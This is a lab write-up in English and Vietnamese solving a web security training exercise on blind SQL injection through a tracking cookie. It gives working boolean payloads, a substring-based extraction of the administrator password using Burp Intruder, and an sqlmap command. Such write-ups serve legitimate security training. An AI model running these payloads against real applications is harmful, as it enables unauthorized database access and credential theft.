# Lab: Blind SQL injection with conditional responses

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


# Overview

Ở lab này có lỗ hổng blind SQL. Application này sử dụng tracking cookie để phân tích, và biểu diễn SQL query gồm các giá trị cookie được nhập vào.Kết quả của cuộc truy vấn không được trả lại, và không error messages được hiện lên. Nhưng ứng dụng thì bao gồm tin nhắn `Welcome back` ở trang web nếu query trả lại.

Ta cần đăng nhập vào administrator user

Form lab

![image](https://user-images.githubusercontent.com/115911041/232667041-aaff9df7-e91e-4d6b-8680-a669c9d984f5.png)

# Solution

**Confirm vulnerable parameter**

Bởi vì là blind SQL, ta không thể thấy bất kì kết quả của cuộc truy vấn. Tuy nhiên, bởi vì chúng ta có thể request có cho phép dành cho các câu trả lời `True` hoặc `False` 

Bước đầu tiên, ta cần xác định lỗ hổng bằng cách đưa requests cho ra câu trả lời `True` hoặc `False`

**Query**

Query được sử dụng trong lab này sẽ như thế này
```
SELECT trackingId FROM someTable WHERE trackingID = '<COOKIE_VALUE>'
```

![image](https://user-images.githubusercontent.com/115911041/232670060-97d3b04a-285a-4315-a488-aecb2cdd0a52.png)

`Cookie TrackingId=oLNIUOwSGHWlzJH1; session=7B6p6OLLq4GUkMRhCwcZQprHcyc8CRzH`

Ta thấy có xuất hiện `Welcome back` ở phần Response

**True**

```
SELECT trackingId FROM someTable WHERE trackingId = 'oLNIUOwSGHWlzJH1' and 1=1--'
```
![image](https://user-images.githubusercontent.com/115911041/232671266-492e4f61-95d9-433a-8a83-2950e05a114f.png)
Ta thấy có xuất hiện `Welcome back` ở phần Response

**False**
```
SELECT trackingId FROM someTable WHERE trackingId = 'oLNIUOwSGHWlzJH1' and 1=2--'
```
![image](https://user-images.githubusercontent.com/115911041/232671623-2118d0f1-95ab-4c58-b95d-9759a0b7d022.png)
Không thấy xuất hiện `Welcome back`

**Confirm expected table**

Đầu tiên, mình xác nhận table `users` có tồn tại hay không. Lần này, mình sử dụng string dạng chữ từ table và so sánh nó.

``` 
SELECT trackingID FROM someTable WHERE trackingId = 'oLNIUOwSGHWlzJH1' and (select 'x' from users LIMIT 1)='x'--
```
![image](https://user-images.githubusercontent.com/115911041/232673130-8aab11dc-aa5c-4857-a2a0-db5988c96dd2.png)

Có kết quả `Welcome back`

**Verify columns exit as excepted**

```
SELECT trackingId FROM someTable WHERE trackingId = 'oLNIUOwSGHWlzJH1' and (select username from users where username='administrator')='administrator'--
```
![image](https://user-images.githubusercontent.com/115911041/232674592-c908658c-b912-47be-b4ed-bf710bd5b3f9.png)

Xuất hiện `Welcome back`

**Get the length of the password**

Tìm dộ dài của password.Ở đây, chúng ta sử dụng hàm `LENGTH` của database và so sánh nó với số.

![image](https://user-images.githubusercontent.com/115911041/232674862-29620f44-9689-478f-b8dc-2255dcf0e2cb.png)

Không cho ra `Welcome back`, password không có độ dài là 1

Thay vào đó, mình có thể kiểm tra lớn hơn thay vì bằng. Ở kết quả `Welcome back` nghĩa là password có độ dài lớn hơn 1.

Brute force độ dài với Burp Intruder (Sniper, Payload 1)

![image](https://user-images.githubusercontent.com/115911041/232675581-22e6d236-256a-4f15-8286-2d40ef956497.png)

![image](https://user-images.githubusercontent.com/115911041/232675635-5a1aa5b2-e598-4425-8184-caa3d4635c58.png)

Sau đó attack, kiểm tra request nào xuất hiện `Welcome back` thì sẽ ra độ dài của password ở vị trí đó. Mình thì độ dài là 20.

**Enumerate password of the administrator**

Ta đã có độ dài của password, bây giờ đã có thể brute force từng kí tự. Nếu database có lưu trữ hàm hash của password, ta có thể extract hash để cracking offline.

```
SELECT trackingId FROM someTable WHERE trackingId = 'oLNIUOwSGHWlzJH1' and (select substring(password,1,1) from users where username='administrator')='a'--
```
![image](https://user-images.githubusercontent.com/115911041/232677055-c0e64e5e-498a-4551-80db-8c930243ed3e.png)

Ta nhận ra rằng kí tự đầu tiên không phải là `a`, sử dụng Burp Intruder để Brute Force

Attack type: ***Cluster bomb***

![image](https://user-images.githubusercontent.com/115911041/232677551-c4da07a3-98e5-4fb6-989e-1137856b9439.png)

***Payload 1: numeric squential, 1..20***
***Payload 2: Brute force

![image](https://user-images.githubusercontent.com/115911041/232677811-97a163e8-2bfe-450e-867f-d64e8111da07.png)

Theo như số thứ tự của payload 1 sẽ cho ra password:
`iwdzus40xqlsq8zms6v0`

**Tiến hành đăng nhập**

![image](https://user-images.githubusercontent.com/115911041/232678012-ab200efa-8465-4749-b2cf-f941c9ecf68b.png)

# SQL map:

Ta vẫn làm giống cách Burp Suite. Dựa vào lỗ hổng ở phần category. Truy cập vào mục bất kì, sau đó list toàn bộ database bằng sqlmap

`python3 sqlmap.py -u "https://0a41004804f8311284e6eb0e00cd00b8.web-security-academy.net/filter?category=Corporate+gifts" --dbs`




